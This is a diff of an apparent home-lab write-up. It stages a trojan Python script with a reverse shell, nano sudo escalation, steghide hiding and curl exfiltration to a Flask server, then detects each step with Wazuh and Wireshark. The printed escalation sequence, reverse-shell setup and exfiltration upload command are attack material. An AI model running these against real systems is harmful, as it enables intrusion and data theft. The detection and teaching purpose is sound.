@@ -19,12 +19,15 @@ title: BUREAU:03
 </section>
 
 ### The initial Setup
+In this scenario our **lead_engineer** has downloaded a tool from a compromised website.<br>
+The tool is a python script that acts as a Trojan. Contains a legitimate math calculation function<br>
+and in the background unbeknownst to the host it establishes a shell with the adversarial box.<br>
 
-ead_engineer@TECH-BUREAU-UBUNTU-24:~/PROJECT.5527$ ls
-Frame_specs.txt  T1:Pennsylvania.jpg  VALIDATOR_v3.0.py
-T1:Casing.jpg    T1_test_results.txt  Valve_specs.txt
-lead_engineer@TECH-BUREAU-UBUNTU-24:~/PROJECT.5527$ 
-...
+<pre data-label="ls" style="--delay: 0.5s;"><code>
+<span class="orange"><strong>lead_engineer@TECH-BUREAU-UBUNTU-24:</strong></span>~/PROJECT.5527$ ls
+Frame_specs.txt  T1:Pennsylvania.jpg  <span class="orange"><strong>VALIDATOR_v3.0.py</strong></span>
+<span class="orange"><strong>T1:Casing.jpg</strong></span>    <span class="orange"><strong>T1_test_results.txt</strong></span>  Valve_specs.txt
+</code></pre>
 
 # AT4K-3XPR3S rolling out.
 
@@ -44,7 +47,10 @@ Enter path to schematic file (.txt): <span class="orange"><strong>Frame_specs.tx
 Analysis complete. Closing validator...
 </code></pre>
 
-Here the user lead_engineer is enjoying the convenience of a piece of python script taht allows for hypothetical error checking in his work. The Validator asks for a file path, the file path is provided. Actualy now that i think about it would be cool to make a version that just sends out the file to teh Comand center...but anyhow. The pyton script works as indended and in the meantime a background process initializes a reverse shell with out attack box. How handy.
+Here the user ***lead_engineer** is enjoying the convenience of a piece of **Python** script<br>
+that allows for hypothetical error checking in his work.<br>
+The Validator asks for a file path, the file path is provided. The Python script works as intended<br>
+and in the meantime a background process initializes a reverse shell with out attack box. How handy.<br>
 
 ### CODE SAMPLE
 
@@ -87,11 +93,15 @@ start_background_sync()
 interactive_parser()
 </code></pre>
 
-In this sample we see an example of base64 obfuscation, the malicious payload is rolled up in to a long string that upon script execution is translated in to its original form and the reverse shell can comence. Nifty.
+In this sample we see an example of base64 obfuscation, the malicious payload is rolled up<br>
+in to a long string that upon script execution is translated in to its original form<br>
+and the reverse shell can commence. Nifty.<br>
 
 ## 02.BECOMING ROOT
 
-After recieving the connection over our netcat listener port 4433 we stabilise teh shell and begin carying out our most daring exfiltration yet. But we need to gain the root priviliges for that. So we check for any users that can run programs with elevated priviliges with no need for a password.
+After receiving the connection over our **Netcat listener** port **4433** we stabilize the shell<br>
+and begin carrying out our most daring exfiltration yet. But we need to gain the root privileges.<br>
+So we check for any users that can run programs with elevated privileges with no need for a password.<br>
 
 <pre data-label="NOPASSWD" style="--delay: 0.7s;"><code>
 <span class="orange"><strong>lead_engineer@TECH-BUREAU-UBUNTU-24:</strong></span>~/PROJECT.5527$ sudo -l
@@ -108,7 +118,7 @@ User <span class="orange"><strong>lead_engineer</strong></span> may run the foll
 We have **nano** as our contender for the <span class="orange"><strong>GTFOBIN</strong></span> escalation. We need to open **nano** and run a few commands in sequence<br>
 <span class="badge-data"><strong>Ctrl + R, Ctrl + X, reset; sh 1>&0 2>&0, Enter</strong></span>
 
-##.03 STEGONOGRAPHY
+##.03 STEGANOGRAPHY
 
 First we install <span class="orange"><strong>Steghide</strong></span> on to our target machine<br>
 via <span class="badge-data"><strong>sudo apt-get update && sudo apt-get install steghide -y</strong></span><br>
@@ -137,7 +147,7 @@ Frame_specs.txt     T1:Casing.jpg        <span class="orange"><strong>T1_test_re
 <span class="orange"><strong>Seabass_Trophy.jpg</strong></span>  T1:Pennsylvania.jpg  VALIDATOR_v3.0.py
 </code></pre>
 We copy a schematic image and rename it to something our engineer might share over the internet,<br>
-we have learned that he infact is an avid fishing enthusiast.
+through "**OSINT**"we have learned that he in fact is an avid fishing enthusiast.<br>
 
 ### STEGHIDE
 <pre data-label="STEGHIDE" style="--delay: 0s;"><code>
@@ -146,7 +156,9 @@ Enter passphrase: <span class="red"><strong>AT4K-3XPR3S</strong></span>
 Re-Enter passphrase: <span class="red"><strong>AT4K-3XPR3S</strong></span>
 embedding <span class="orange"><strong>"T1_test_results.txt"</strong></span> in <span class="orange"><strong>"T1:Casing.jpg"</strong></span>... done
 </code></pre>
-And just like that we have an inconspicuous image, that contains text data that we can now sneakily send to a hypothetical inocent looking website that is actualy a disguised upload server for our pilfered data.
+And just like that we have an inconspicuous image, that contains text data that we can now<br>
+sneakily send to a hypothetical innocent looking website that is actually a disguised<br>
+upload server for our pilfered data.<br>
 
 ## 04.BEGIN EXFILTRATION
 ### SERVER SPINUP
@@ -158,7 +170,7 @@ WARNING: This is a development server. Do not use it in a production deployment.
  * Running on http://192.168.1.16:<span class="orange"><strong>4040</strong></span>
 Press CTRL+C to quit
 </code></pre>
-In this case we use a python Flask server to emulate a website so the data can be sent out via a standart POST. 
+In this case we use a **Python Flask** server to emulate a website so the data can be sent out via a standart POST.<br>
 
 ### EXFILTRATE
 
@@ -168,7 +180,10 @@ In this case we use a python Flask server to emulate a website so the data can b
   -F "file=@<span class="orange"><strong>Seabass_Trophy.jpg</strong></span>"
 [*] File Seabass_Trophy.jpg exfiltrated successfully.
 </code></pre>
-We also encorporated a authentication function with the X-Auth-Token, to make sure noone can use the server but us. The exfiltration is a success. We just need to get teh data out of teh jpg file on our attack machine and upon succes, erase the Seabass Steg file we created and we are done here.
+We also incorporated a authentication function with the **X-Auth-Token**,<br>
+to make sure no one can use the server but us. The exfiltration is a success.<br>
+We just need to get the data out of the **JPG** file on our attack machine and upon success,<br>
+erase the Seabass Steg file we created and we are done here.<br>
 
 ### REVERSE STEGHIDE
 
@@ -178,6 +193,8 @@ steghide extract -sf <span class="orange"><strong>Seabass_Trophy.jpg</strong></s
 Enter passphrase: <span class="red"><strong>AT4K-3XPR3S</strong></span>
 wrote extracted data to "T1_test_results.txt".
 </code></pre>
+
+And again just like that the data is pulled out of the image file.
 
 ### DELETE AND EXIT
 
@@ -205,7 +222,8 @@ Thank You and Good Bye.
 
 <small>“01.wazuh-alerts.png”<small>
 
-Again we can observe the entire attack chain. So neat and organised. And this time arround we have a couple of Wazuh defalt alerts that snuck in, very helpful. Let dive in to teh analisys.
+We can observe the entire attack chain. So neat and organized. And this time around<br>
+we have a couple of Wazuh default alerts that suck in, very helpful. Let dive in to the analysis.<br>
 
 ## 02.WAZUH OUTBOUND TRAFFIC
 
@@ -213,7 +231,8 @@ Again we can observe the entire attack chain. So neat and organised. And this ti
 
 <small>“02.wazuh-4433-out.png”<small>
 
-We have setup the rule so that any trafic going out thats not port 22, 80, 443, 3306 will triger an alert, and print the precise port used. How handy.
+We have setup the rule so that any traffic going out that's not **port 22, 80, 443, 3306**<br>
+will trigger an alert, and print the precise port used. Convenient.<br>
 
 ## 09.WIRESHARK SHELL TRAFFIC
 
@@ -221,7 +240,7 @@ We have setup the rule so that any trafic going out thats not port 22, 80, 443, 
 
 <small>“09.wireshark-shell-traffic.png”<small>
 
-We see loads of trafic going to port 4433, we want to see the stream imediatly.
+We see loads of traffic going to port 4433, we want to see the stream immediately.
 
 ## 10.WIRESHARK SHELL STREAM
 
@@ -229,7 +248,8 @@ We see loads of trafic going to port 4433, we want to see the stream imediatly.
 
 <small>“10.wireshark-shell-stream.png”<small>
 
-Here is but a snippet, all in broad daylight, unencrypted and loud, we can see every single comman on display from start to finish.
+Here is but a snippet, all in broad daylight, unencrypted and loud,<br>
+we can see every single command on display from start to finish.<br>
 
 #### ‹‹‹REVERSE SHELL CONFIRMED›››
 
@@ -239,7 +259,7 @@ Here is but a snippet, all in broad daylight, unencrypted and loud, we can see e
 
 <small>“03.wazuh-cat.png”<small>
 
-We know the drill by now, guarded file accessed.
+We know the drill by now, guarded file accessed.<br>
 
 ## 04.WAZUH PACKAGE INSTALLED
 
@@ -247,14 +267,15 @@ We know the drill by now, guarded file accessed.
 
 <small>“04.wazuh-package-installed.png”<small>
 
-Here we are alerted that a new package is installed by the user root, the program in question is STEGHIDE.
+Here we are alerted that a new package is installed by the user root,<br>
+the program in question is **STEGHIDE**.<br>
 
 ## 05.WAZUH STEGHISE USED
 ![05.wazuh-steghide-used.png](assets/images/tech-bureau/phase.03/05.wazuh-steghide-used.png)
 
 <small>“05.wazuh-steghide-used.png”<small>
 
-STEGHIDE is on the watched programs list. It has been run.
+**STEGHIDE** is on the watched programs list. It has been run.<br>
 
 ## 07.WAZUH CURL
 
@@ -262,7 +283,7 @@ STEGHIDE is on the watched programs list. It has been run.
 
 <small>“07.wazuh-CURL.png”<small>
 
-Here we see that CURL has been used, and it is on the watch list.
+Here we see that **CURL** has been used, and it is on the watch list.<br>
 
 ## 06.WAZUH OUTBOUND TRAFFIC 4040
 
@@ -270,7 +291,7 @@ Here we see that CURL has been used, and it is on the watch list.
 
 <small>“06.wazuh-4040-out.png”<small>
 
-To add to the evidence we can see that a non standart port 4040 is in use.
+To add to the evidence we can see that a non standart port **4040** is in use.<br>
 
 ## 11.WIRESHARK CURL-CROSS
 
@@ -278,7 +299,9 @@ To add to the evidence we can see that a non standart port 4040 is in use.
 
 <small>“11.wireshark-post-traffic.png”<small>
 
-Suspicious POST request to a website, over a nonstandart port 4040. I would run the website ip through VirusTotal in a real scenario. Lets see what teh stream has to show us.
+Suspicious **POST** request to a website, over a nonstandard port **4040**.<br>
+I would run the website IP through **VirusTotal** in a real scenario.<br>
+Lets see what the stream has to show us.<br>
 
 ### RULE USED:
 
@@ -292,7 +315,10 @@ Suspicious POST request to a website, over a nonstandart port 4040. I would run 
 
 <small>“12.wireshark-post-stream.png”<small>
 
-Here we can see the details of a file named Seabass_Rtophy.jpeg a POST /upload folder destination an authentication token, and an important detail, curl is used as an agent, in a normal scenario our user wold use the internet browser to upload his image, in which case the agnet would be something like Mozilla/5.0. 
+Here we can see the details of a file named Seabass_Rtophy.jpeg a POST /upload folder destination<br>
+an authentication token, and an important detail, curl is used as an agent, in a normal scenario<br>
+our user wold use the internet browser to upload his image,<br>
+in which case the Agent would be something like Mozilla/5.0.<br>
 
 ### RULE USED:
 
@@ -309,7 +335,7 @@ Here we can see the details of a file named Seabass_Rtophy.jpeg a POST /upload f
 
 <small>“08.wazuh-delete.png”<small>
 
-This would be abuilt in Wazuh alert, we can see clearly the file in question.<br>
+This would be a built in Wazuh alert, we can see clearly the file in question.<br>
 
 #### ‹‹‹DATA DESTROYED››› 
 
@@ -319,21 +345,24 @@ This would be abuilt in Wazuh alert, we can see clearly the file in question.<br
 
 <small>“17.ghex-carving.png”<small>
 
-Using a simple hex tool like GHEX allows us to cleanup the rax data and make sure that we only have the jpeg without any pcap traffic headers. Jpeg files start with a FF D8 FF and finish with a FF D9. So we delete everything before and after our markers, and save the file.
+Using a simple hex tool like **GHEX** allows us to cleanup the **raw** data and make sure that<br>
+we only have the jpeg without any pcap traffic headers. **JPEG** files start with a FF D8 FF<br>
+and finish with a FF D9. So we delete everything before and after our markers, and save the file.<br>
 
 ## 18.RECONSTRUCTED IMAGE
 ![T1:Casing.jpg](assets/images/tech-bureau/phase.03/T1:Casing.jpg)
 
 <small>“T1:Casing.jpg”<small>
 
-Here is the jpeg file that we reconstructed, and what about teh hidden data?
+Here is the **JPEG** file that we reconstructed, and what about the hidden data?<br>
 
 ## 19.REVERSE STEGANOGRAPHY?
 ![18.pcap-image-steghide.png](assets/images/tech-bureau/phase.03/18.pcap-image-steghide.png)
 
 <small>“18.pcap-image-steghide.png”<small>
 
-Steghide info shows that there is something inside, lets asume we have cracked the password and entered it correctly. That provides the exact content taht has been stolen.
+Steghide info shows that there is something inside, lets assume we have cracked the password<br>
+and entered it correctly. That provides the exact content that has been stolen.<br>
 
 ## LESSONS LEARNED
 
